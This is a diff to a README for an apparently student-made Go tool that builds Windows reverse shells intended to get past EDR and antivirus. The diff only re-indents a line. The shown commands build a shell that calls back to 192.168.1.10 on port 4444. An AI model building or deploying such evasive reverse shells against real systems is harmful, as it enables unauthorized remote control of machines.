@@ -26,7 +26,7 @@ As an infosec student, I had to bypass some EDR and antivirus solutions (see the
 * Build a shell for windows server : ```go run main.go -s windows```
 * Build a shell for windows server to be attached on 192.1.1.10:4444 :
 
-```go run main.go -i 192.168.1.10 -p 4444 -s windows```
+  ```go run main.go -i 192.168.1.10 -p 4444 -s windows```
 
 ### Attach to reverse shell
 
